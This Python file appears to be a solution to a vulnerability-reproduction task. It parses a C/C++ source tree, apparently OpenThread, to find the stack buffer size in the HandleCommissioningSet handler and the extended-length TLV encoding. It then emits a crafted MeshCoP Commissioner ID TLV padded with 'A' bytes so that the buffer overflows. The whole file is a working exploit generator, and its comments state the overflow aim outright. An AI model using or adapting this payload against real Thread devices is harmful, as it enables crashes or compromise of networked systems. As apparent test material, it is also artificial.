import os
import re
import tarfile
import ast
from typing import Dict, Iterator, Optional, Tuple


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("names",)

    def __init__(self, names: Dict[str, int]):
        self.names = names

    def visit_Expression(self, node):
        return self.visit(node.body)

    def visit_Constant(self, node):
        if isinstance(node.value, (int,)):
            return int(node.value)
        raise ValueError("bad constant")

    def visit_Num(self, node):
        return int(node.n)

    def visit_Name(self, node):
        if node.id in self.names:
            return int(self.names[node.id])
        raise KeyError(node.id)

    def visit_UnaryOp(self, node):
        v = self.visit(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("bad unary")

    def visit_BinOp(self, node):
        a = self.visit(node.left)
        b = self.visit(node.right)
        op = node.op
        if isinstance(op, ast.Add):
            return a + b
        if isinstance(op, ast.Sub):
            return a - b
        if isinstance(op, ast.Mult):
            return a * b
        if isinstance(op, ast.FloorDiv):
            return a // b
        if isinstance(op, ast.Div):
            return a // b
        if isinstance(op, ast.Mod):
            return a % b
        if isinstance(op, ast.LShift):
            return a << b
        if isinstance(op, ast.RShift):
            return a >> b
        if isinstance(op, ast.BitOr):
            return a | b
        if isinstance(op, ast.BitAnd):
            return a & b
        if isinstance(op, ast.BitXor):
            return a ^ b
        raise ValueError("bad binop")

    def visit_Call(self, node):
        raise ValueError("calls not allowed")

    def visit_Attribute(self, node):
        raise ValueError("attr not allowed")

    def generic_visit(self, node):
        raise ValueError(f"bad node: {type(node).__name__}")


def _strip_int_suffixes(expr: str) -> str:
    expr = re.sub(r"(?<=\d)[uUlL]+\b", "", expr)
    expr = re.sub(r"0b[01_]+", lambda m: str(int(m.group(0).replace("_", ""), 2)), expr)
    expr = re.sub(r"0x[0-9a-fA-F_]+", lambda m: str(int(m.group(0).replace("_", ""), 16)), expr)
    expr = re.sub(r"(?<![\w])(\d[\d_]*)(?![\w])", lambda m: m.group(1).replace("_", ""), expr)
    return expr


def _safe_int_eval(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = _strip_int_suffixes(expr)
    if "sizeof" in expr or "alignof" in expr:
        return None
    expr = expr.replace("::", "_")
    expr = re.sub(r"\btrue\b", "1", expr, flags=re.IGNORECASE)
    expr = re.sub(r"\bfalse\b", "0", expr, flags=re.IGNORECASE)
    expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.DOTALL)
    expr = re.sub(r"//.*?$", "", expr, flags=re.MULTILINE)
    expr = expr.strip()
    if not expr:
        return None
    if not re.fullmatch(r"[A-Za-z0-9_+\-*/%<>&^|~() \t\r\n]+", expr):
        return None
    try:
        tree = ast.parse(expr, mode="eval")
        ev = _SafeEval(names)
        return int(ev.visit(tree))
    except Exception:
        return None


def _iter_source_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                lower = fn.lower()
                if not (lower.endswith(".c") or lower.endswith(".cc") or lower.endswith(".cpp") or lower.endswith(".h") or lower.endswith(".hpp")):
                    continue
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        yield p, f.read()
                except Exception:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name
                lower = name.lower()
                if not (lower.endswith(".c") or lower.endswith(".cc") or lower.endswith(".cpp") or lower.endswith(".h") or lower.endswith(".hpp")):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield name, data
                except Exception:
                    continue
    except Exception:
        return


def _decode_text(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _build_constant_map(src_path: str) -> Dict[str, int]:
    names: Dict[str, int] = {}

    define_re = re.compile(r"^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)[ \t]+(.+?)\s*$", re.MULTILINE)
    constexpr_re = re.compile(
        r"(?:(?:static\s+)?constexpr|static\s+const|const)\s+(?:[\w:<>]+\s+)+([A-Za-z_]\w*)\s*=\s*([^;]+);",
        re.MULTILINE,
    )
    enum_block_re = re.compile(r"\benum\b[^;{]*\{([^}]+)\}", re.MULTILINE | re.DOTALL)
    enum_entry_re = re.compile(r"([A-Za-z_]\w*)\s*=\s*([^,}]+)")

    raw_defs: Dict[str, str] = {}

    for path, data in _iter_source_files(src_path):
        txt = _decode_text(data)
        for m in define_re.finditer(txt):
            name = m.group(1)
            expr = m.group(2).strip()
            if "(" in name:
                continue
            if name not in raw_defs:
                raw_defs[name] = expr

        for m in constexpr_re.finditer(txt):
            name = m.group(1)
            expr = m.group(2).strip()
            if name not in raw_defs:
                raw_defs[name] = expr

        for bm in enum_block_re.finditer(txt):
            block = bm.group(1)
            for em in enum_entry_re.finditer(block):
                name = em.group(1)
                expr = em.group(2).strip()
                if name not in raw_defs:
                    raw_defs[name] = expr

    # Also populate flattened scope variants (X::Y -> X_Y)
    for k, v in list(raw_defs.items()):
        if "::" in k:
            raw_defs[k.replace("::", "_")] = v

    # Iterative resolution
    for _ in range(6):
        progressed = False
        for name, expr in list(raw_defs.items()):
            if name in names:
                continue
            v = _safe_int_eval(expr, names)
            if v is None:
                continue
            names[name] = v
            progressed = True
        if not progressed:
            break

    return names


def _detect_extended_marker(src_path: str, consts: Dict[str, int]) -> int:
    for key in ("kExtendedLength", "kEscapeLength", "kExtendedTlvLength", "kExtendedLengthValue"):
        if key in consts:
            v = consts[key]
            if 0 <= v <= 255:
                return v
    # Heuristic scan
    pat = re.compile(r"\bkExtendedLength\b\s*=\s*(0x[0-9a-fA-F]+|\d+)")
    for path, data in _iter_source_files(src_path):
        if b"ExtendedLength" not in data and b"kExtendedLength" not in data:
            continue
        txt = _decode_text(data)
        m = pat.search(txt)
        if m:
            try:
                return int(m.group(1), 0) & 0xFF
            except Exception:
                pass
    return 0xFF


def _detect_endianness_for_extended_length(src_path: str) -> str:
    # Default to big endian
    big_hits = 0
    little_hits = 0
    for path, data in _iter_source_files(src_path):
        lower = path.lower()
        if "tlv" not in lower and "tlvs" not in lower and "meshcop" not in lower and "network_data" not in lower and "networkdata" not in lower:
            continue
        txt = _decode_text(data)
        if "Extended" not in txt and "extended" not in txt and "kExtended" not in txt:
            continue
        if "BigEndian::ReadUint16" in txt or "BigEndian::ReadUint16(" in txt:
            big_hits += 1
        if "LittleEndian::ReadUint16" in txt or "LittleEndian::ReadUint16(" in txt:
            little_hits += 1
    if little_hits > big_hits:
        return "little"
    return "big"


def _extract_function_body(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    brace = text.find("{", idx)
    if brace < 0:
        return None
    depth = 0
    i = brace
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace : i + 1]
        i += 1
    return None


def _find_stack_buffer_size_for_commissioning_set(src_path: str, consts: Dict[str, int]) -> Optional[int]:
    func_body = None
    for path, data in _iter_source_files(src_path):
        if b"HandleCommissioningSet" not in data:
            continue
        txt = _decode_text(data)
        body = _extract_function_body(txt, "HandleCommissioningSet")
        if body:
            func_body = body
            break
    if not func_body:
        return None

    array_decl_re = re.compile(
        r"\b(uint8_t|char|unsigned\s+char)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n;]+)\s*\]\s*;",
        re.MULTILINE,
    )
    arrays = []
    for m in array_decl_re.finditer(func_body):
        var = m.group(2)
        size_expr = m.group(3).strip()
        arrays.append((var, size_expr))

    if not arrays:
        return None

    # Prefer arrays that appear as destination in Read/memcpy/memmove
    dest_used = set()
    for var, _ in arrays:
        if re.search(r"\b(ReadBytes|Read|memcpy|memmove|memset)\s*\([^;]*\b" + re.escape(var) + r"\b", func_body):
            dest_used.add(var)

    best = None
    for var, size_expr in arrays:
        if dest_used and var not in dest_used:
            continue
        expr = size_expr.replace("::", "_").strip()
        # Take last scoped token (A::B) -> B also
        last_tok = size_expr.split("::")[-1].strip()
        v = _safe_int_eval(expr, consts)
        if v is None and last_tok != size_expr:
            v = consts.get(last_tok)
        if v is None:
            v = consts.get(expr)
        if v is None:
            continue
        if v <= 0 or v > 65535:
            continue
        if best is None or v > best:
            best = v

    if best is None:
        return None

    # Sanity range heuristic: typical stack buffers
    if not (64 <= best <= 8192):
        return None
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        consts = _build_constant_map(src_path)
        ext_marker = _detect_extended_marker(src_path, consts)
        endian = _detect_endianness_for_extended_length(src_path)

        buf_size = _find_stack_buffer_size_for_commissioning_set(src_path, consts)

        if buf_size is None:
            value_len = 840
        else:
            # Ensure we both overflow buffer (by 1) and use extended length encoding (> 255)
            total_len = max(buf_size + 1, 260)  # 4 header + 256 value => 260 bytes minimum
            value_len = total_len - 4

        if value_len > 0xFFFF:
            value_len = 0xFFFF

        tlv_type = 0x0A  # Commissioner ID (valid MeshCoP TLV type)
        length_bytes = int(value_len).to_bytes(2, byteorder=endian, signed=False)
        payload = bytes([tlv_type & 0xFF, ext_marker & 0xFF]) + length_bytes + (b"A" * value_len)
        return payload